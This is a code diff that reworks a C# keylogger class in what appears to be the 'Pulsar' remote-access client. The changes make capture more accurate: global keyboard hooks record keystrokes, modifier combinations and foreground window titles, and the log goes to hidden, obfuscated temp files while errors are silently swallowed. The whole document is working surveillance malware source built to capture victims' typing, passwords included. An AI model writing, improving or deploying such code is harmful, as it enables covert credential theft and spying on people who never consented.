@@ -1,10 +1,8 @@
 ﻿using Gma.System.MouseKeyHook;
-using Pulsar.Client.Extensions;
 using Pulsar.Client.Helper;
 using Pulsar.Common.Helpers;
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Timers;
@@ -17,26 +15,38 @@ namespace Pulsar.Client.Logging
     {
         private readonly long _maxLogFileSize;
         private readonly Timer _flushTimer;
+        private readonly StringBuilder _lineBuffer = new StringBuilder();
         private readonly object _syncLock = new object();
-        private readonly StringBuilder _currentBuffer = new StringBuilder();
         private readonly IKeyboardMouseEvents _events;
 
-        private string _currentWindow = string.Empty;
+        private string _currentWindow = "";
         private DateTime _lastWindowChange = DateTime.UtcNow;
+        private readonly TimeSpan _windowChangeThreshold = TimeSpan.FromSeconds(1);
+
         private string _logFilePath;
         private bool _isFirstWrite = true;
-        private readonly TimeSpan _windowChangeThreshold = TimeSpan.FromSeconds(1);
+
+        private readonly HashSet<Keys> _heldModifiers = new HashSet<Keys>();
+        private readonly HashSet<Keys> _processedKeys = new HashSet<Keys>();
+
         public bool IsDisposed { get; private set; }
+
+        private string _rawWindowTitle = "";
+        private DateTime _rawWindowTitleLastChange = DateTime.UtcNow;
+        private readonly TimeSpan _titleStabilizeTime = TimeSpan.FromMilliseconds(350);
 
         public Keylogger(double flushInterval, long maxLogFileSize)
         {
             _maxLogFileSize = maxLogFileSize;
-            _events = Hook.GlobalEvents();
             _logFilePath = GetLogFilePath();
 
-            _flushTimer = new Timer(flushInterval);
+            _events = Hook.GlobalEvents();
+
+            _flushTimer = new Timer(flushInterval)
+            {
+                AutoReset = true
+            };
             _flushTimer.Elapsed += TimerElapsed;
-            _flushTimer.AutoReset = true;
         }
 
         public void Start()
@@ -48,99 +58,47 @@ namespace Pulsar.Client.Logging
         private void Subscribe()
         {
             _events.KeyDown += OnKeyDown;
+            _events.KeyUp += OnKeyUp;
             _events.KeyPress += OnKeyPress;
         }
 
         private void Unsubscribe()
         {
             _events.KeyDown -= OnKeyDown;
+            _events.KeyUp -= OnKeyUp;
             _events.KeyPress -= OnKeyPress;
         }
 
         private void OnKeyDown(object sender, KeyEventArgs e)
         {
-            string newWindow = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";
+            // Track window changes
+            string win = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";
 
             lock (_syncLock)
             {
-                bool windowChanged = newWindow != _currentWindow;
-                bool enoughTimePassed = DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold;
+                bool windowChanged = !string.Equals(win, _currentWindow, StringComparison.Ordinal);
 
-                // Check if window changed significantly
-                if (windowChanged && enoughTimePassed)
+                if (windowChanged && DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold)
                 {
-                    _currentWindow = newWindow;
+                    FlushLineBuffer();
+                    _currentWindow = win;
                     _lastWindowChange = DateTime.UtcNow;
-
-                    // Start a fresh line for the new window
-                    if (_currentBuffer.Length > 0 && !_currentBuffer.ToString().EndsWith(Environment.NewLine))
-                        _currentBuffer.AppendLine();
-
-                    // Append window header cleanly
-                    _currentBuffer.AppendLine($"[{DateTime.UtcNow:HH:mm:ss}] {newWindow}");
+                    _lineBuffer.AppendLine($"[{DateTime.Now:HH:mm:ss}] {win}");
+                    _lineBuffer.AppendLine();  // <-- NEW forced blank line
                 }
 
-                HandleSpecialKey(e);
-            }
-        }
-
-        private void HandleSpecialKey(KeyEventArgs e)
-        {
-            switch (e.KeyCode)
-            {
-                case Keys.Enter:
-                    _currentBuffer.AppendLine();
-                    break;
-                case Keys.Back:
-                    HandleBackspace();
-                    break;
-                case Keys.Space:
-                    _currentBuffer.Append(' ');
-                    break;
-                case Keys.Tab:
-                    _currentBuffer.Append("\t");
-                    break;
-                case Keys.Escape:
-                    _currentBuffer.Append("[Esc]");
-                    break;
-                case Keys.Delete:
-                    _currentBuffer.Append("[Del]");
-                    break;
-                case Keys.Up:
-                case Keys.Down:
-                case Keys.Left:
-                case Keys.Right:
-                    // Ignore arrow keys to reduce noise
-                    break;
-                case Keys.LControlKey:
-                case Keys.RControlKey:
-                case Keys.LShiftKey:
-                case Keys.RShiftKey:
-                case Keys.LMenu:
-                case Keys.RMenu:
-                case Keys.LWin:
-                case Keys.RWin:
-                    // Ignore modifier keys alone
-                    break;
-                default:
-                    // Log function keys
-                    if (e.KeyCode >= Keys.F1 && e.KeyCode <= Keys.F24)
-                    {
-                        _currentBuffer.Append($"[{e.KeyCode}]");
-                    }
-                    break;
-            }
-        }
-
-        private void HandleBackspace()
-        {
-            if (_currentBuffer.Length > 0)
-            {
-                // Remove last character if it's not part of a window header
-                char lastChar = _currentBuffer[_currentBuffer.Length - 1];
-                if (lastChar != '\n' && lastChar != '\r' && lastChar != ']')
+                // Only process special keys in KeyDown, skip printable characters
+                if (IsModifierKey(e.KeyCode))
                 {
-                    _currentBuffer.Length--;
+                    _heldModifiers.Add(e.KeyCode);
+                    return;
+                }
+
+                // Mark key as processed to avoid double handling
+                if (!_processedKeys.Contains(e.KeyCode))
+                {
+                    _processedKeys.Add(e.KeyCode);
+                    HandleSpecialKey(e.KeyCode);
                 }
             }
         }
@@ -149,35 +107,183 @@ namespace Pulsar.Client.Logging
         {
             lock (_syncLock)
             {
-                if (!char.IsControl(e.KeyChar))
-                    _currentBuffer.Append(e.KeyChar);
-                else if (e.KeyChar == '\r') // Enter key
-                    _currentBuffer.AppendLine();
+                // Only handle printable characters in KeyPress
+                if (char.IsControl(e.KeyChar))
+                    return;
+
+                string mods = BuildModifierString();
+                _lineBuffer.Append(mods + e.KeyChar);
+
+                // Clear modifiers after typing a character
+                _heldModifiers.Clear();
             }
+        }
+
+        private void OnKeyUp(object sender, KeyEventArgs e)
+        {
+            lock (_syncLock)
+            {
+                _heldModifiers.Remove(e.KeyCode);
+                _processedKeys.Remove(e.KeyCode);
+            }
+        }
+
+        private void HandleSpecialKey(Keys key)
+        {
+            string mods = BuildModifierString();
+            string keyText = GetSpecialKeyText(key);
+
+            if (!string.IsNullOrEmpty(keyText))
+            {
+                _lineBuffer.Append(mods + keyText);
+
+                // Add space after certain special keys for readability
+                if (keyText == "[Enter]")
+                {
+                    _lineBuffer.AppendLine();
+                    FlushLineBuffer();
+                }
+                else if (ShouldAddSpaceAfter(key))
+                {
+                    _lineBuffer.Append(" ");
+                }
+
+                // Clear modifiers after special key
+                _heldModifiers.Clear();
+            }
+        }
+
+        private bool ShouldAddSpaceAfter(Keys key)
+        {
+            switch (key)
+            {
+                case Keys.Tab:
+                case Keys.Escape:
+                case Keys.Up:
+                case Keys.Down:
+                case Keys.Left:
+                case Keys.Right:
+                case Keys.F1:
+                case Keys.F2:
+                case Keys.F3:
+                case Keys.F4:
+                case Keys.F5:
+                case Keys.F6:
+                case Keys.F7:
+                case Keys.F8:
+                case Keys.F9:
+                case Keys.F10:
+                case Keys.F11:
+                case Keys.F12:
+                    return true;
+                default:
+                    return false;
+            }
+        }
+
+        private string GetSpecialKeyText(Keys key)
+        {
+            switch (key)
+            {
+                case Keys.Enter: return "[Enter]";
+                case Keys.Back: return "[Back]";
+                case Keys.Tab: return "[Tab]";
+                case Keys.Escape: return "[Esc]";
+                case Keys.Delete: return "[Del]";
+                case Keys.Up: return "[Up]";
+                case Keys.Down: return "[Down]";
+                case Keys.Left: return "[Left]";
+                case Keys.Right: return "[Right]";
+                case Keys.Space: return " "; // Space as actual space, not [Space]
+                case Keys.F1: return "[F1]";
+                case Keys.F2: return "[F2]";
+                case Keys.F3: return "[F3]";
+                case Keys.F4: return "[F4]";
+                case Keys.F5: return "[F5]";
+                case Keys.F6: return "[F6]";
+                case Keys.F7: return "[F7]";
+                case Keys.F8: return "[F8]";
+                case Keys.F9: return "[F9]";
+                case Keys.F10: return "[F10]";
+                case Keys.F11: return "[F11]";
+                case Keys.F12: return "[F12]";
+                case Keys.F13: return "[F13]";
+                case Keys.F14: return "[F14]";
+                case Keys.F15: return "[F15]";
+                case Keys.F16: return "[F16]";
+                case Keys.F17: return "[F17]";
+                case Keys.F18: return "[F18]";
+                case Keys.F19: return "[F19]";
+                case Keys.F20: return "[F20]";
+                case Keys.F21: return "[F21]";
+                case Keys.F22: return "[F22]";
+                case Keys.F23: return "[F23]";
+                case Keys.F24: return "[F24]";
+                default: return null;
+            }
+        }
+
+        private bool IsModifierKey(Keys k)
+        {
+            return k == Keys.LShiftKey || k == Keys.RShiftKey ||
+                   k == Keys.LControlKey || k == Keys.RControlKey ||
+                   k == Keys.LMenu || k == Keys.RMenu ||
+                   k == Keys.ShiftKey || k == Keys.ControlKey || k == Keys.Menu;
+        }
+
+        private string BuildModifierString()
+        {
+            if (_heldModifiers.Count == 0)
+                return "";
+
+            // 🔥 NEW: Ignore Shift completely for printable characters
+            if (_heldModifiers.Count == 1 &&
+                (_heldModifiers.Contains(Keys.LShiftKey) || _heldModifiers.Contains(Keys.RShiftKey) ||
+                 _heldModifiers.Contains(Keys.ShiftKey)))
+            {
+                return "";
+            }
+
+            StringBuilder sb = new StringBuilder();
+            foreach (var m in _heldModifiers)
+            {
+                // Skip Shift — it’s not a meaningful modifier for logging unless combined with others
+                if (m == Keys.LShiftKey || m == Keys.RShiftKey || m == Keys.ShiftKey)
+                    continue;
+
+                string modName = m.ToString()
+                    .Replace("L", "")
+                    .Replace("R", "")
+                    .Replace("Key", "")
+                    .Replace("Control", "Ctrl")
+                    .Replace("Menu", "Alt");
+
+                if (!string.IsNullOrEmpty(modName))
+                    sb.Append($"[{modName}]");
+            }
+
+            return sb.ToString();
         }
 
         private void TimerElapsed(object sender, ElapsedEventArgs e)
         {
-            try
-            {
-                FlushToFile();
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Keylogger flush error: {ex.Message}");
-            }
+            try { FlushLineBuffer(); } catch { }
         }
 
-        private void FlushToFile()
+        private void FlushLineBuffer()
         {
             lock (_syncLock)
             {
-                if (_currentBuffer.Length == 0) return;
+                if (_lineBuffer.Length == 0) return;
 
-                string contentToWrite = _currentBuffer.ToString();
-                _currentBuffer.Clear();
+                // Clean up multiple spaces but preserve intentional ones
+                string content = _lineBuffer.ToString();
+                _lineBuffer.Clear();
 
-                WriteToFile(contentToWrite);
+                // Replace multiple spaces with single space, but be careful with special keys
+                content = System.Text.RegularExpressions.Regex.Replace(content, @"[ ]{2,}", " ");
+
+                WriteToFile(content);
             }
         }
 
@@ -187,22 +293,14 @@ namespace Pulsar.Client.Logging
 
             try
             {
-                // Write using the obfuscated log helper (handles compression + framing)
-                FileHelper.WriteObfuscatedLogFile(_logFilePath, content + Environment.NewLine);
+                FileHelper.WriteObfuscatedLogFile(_logFilePath, content);
 
-                // Check file size
-                FileInfo info = new FileInfo(_logFilePath);
-                if (info.Length > _maxLogFileSize)
-                {
+                if (new FileInfo(_logFilePath).Length > _maxLogFileSize)
                     RotateLogFile();
-                }
 
-                _isFirstWrite = false; // mark that we’ve written at least once
+                _isFirstWrite = false;
             }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Log file write error: {ex.Message}");
-            }
+            catch { }
         }
 
         private void RotateLogFile()
@@ -213,20 +311,17 @@ namespace Pulsar.Client.Logging
                 string basePath = Path.Combine(Path.GetTempPath(), baseName);
                 string newFilePath = basePath + ".txt";
 
-                int counter = 1;
+                int n = 1;
                 while (File.Exists(newFilePath))
                 {
-                    newFilePath = $"{basePath}_{counter:00}.txt";
-                    counter++;
+                    newFilePath = $"{basePath}_{n:00}.txt";
+                    n++;
                 }
 
                 _logFilePath = newFilePath;
                 _isFirstWrite = true;
             }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Log rotation error: {ex.Message}");
-            }
+            catch { }
         }
 
         private string GetLogFilePath()
@@ -234,10 +329,7 @@ namespace Pulsar.Client.Logging
             return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
         }
 
-        public void FlushImmediately()
-        {
-            FlushToFile();
-        }
+        public void FlushImmediately() => FlushLineBuffer();
 
         public void Dispose()
         {
@@ -251,19 +343,11 @@ namespace Pulsar.Client.Logging
 
             if (disposing)
             {
-                try
-                {
-                    FlushToFile();
-                    Unsubscribe();
-                    _flushTimer.Stop();
-                    _flushTimer.Dispose();
-                    _events.Dispose();
-                    _currentBuffer.Clear();
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine($"Dispose error: {ex.Message}");
-                }
+                FlushLineBuffer();
+                Unsubscribe();
+                _flushTimer.Stop();
+                _flushTimer.Dispose();
+                _events.Dispose();
             }
 
             IsDisposed = true;
